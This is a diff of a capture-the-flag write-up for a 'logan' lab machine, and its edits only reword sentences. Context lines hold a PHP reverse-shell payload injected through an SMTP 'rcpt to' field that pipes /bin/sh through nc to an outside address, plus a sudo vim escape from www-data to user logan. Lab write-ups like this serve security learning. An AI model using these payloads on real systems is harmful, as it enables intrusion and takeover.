@@ -128,7 +128,7 @@ rcpt to:<?php exec("rm /tmp/p;mkfifo /tmp/p;cat /tmp/p|/bin/sh -i 2>&1|nc 192.16
 ![](./img/shell_01.png)
 I could get a user shell (www-data).
 
-When I executed sudo command, I found I can execute vim command with logan's privileges.
+When I executed sudo command, I found I can execute vim command with logan privilege.
 ```
 www-data@logan:/var/www/admin$ sudo -l
 Matching Defaults entries for www-data on logan:
@@ -139,7 +139,7 @@ User www-data may run the following commands on logan:
 www-data@logan:/var/www/admin$ 
 ```
 
-So, I executed vim command with logan's privileges and execute bash command from vim.
+So, I executed vim command as logan with sudo and executed bash command in there.
 ![](./img/shell_02.png)
 ```
 www-data@logan:/var/www/admin$ sudo -u logan /usr/bin/vim
@@ -174,7 +174,7 @@ logan@logan:~$ cat to-do
 - Try the new script that gave me root to learn python
 ```
 
-When I executed sudo command, I found I can execute a python script with root's privileges.
+When I executed sudo command, I found I can execute a python script with root privilege.
 ```
 logan@logan:~$ sudo -l
 Matching Defaults entries for logan on logan:
